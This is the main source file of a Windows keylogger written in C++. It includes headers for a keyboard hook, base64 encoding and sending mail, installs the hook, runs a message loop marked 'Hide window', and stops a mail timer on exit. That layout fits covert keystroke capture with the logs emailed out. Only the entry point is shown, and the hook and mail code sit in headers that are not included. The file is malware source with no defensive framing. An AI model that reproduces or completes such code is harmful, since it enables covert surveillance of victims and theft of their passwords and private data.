#include <iostream>
#include <windows.h>
#include "helper.h"
#include "keyconstants.h"
#include "base64.h"
#include "io.h"
#include "timer.h"
#include "sendmail.h"
#include "keybhook.h"

using namespace std;

int main()
{
    MSG msg;
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();

    // Hide window
    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    MailTimer.Stop();
    return 0;
}
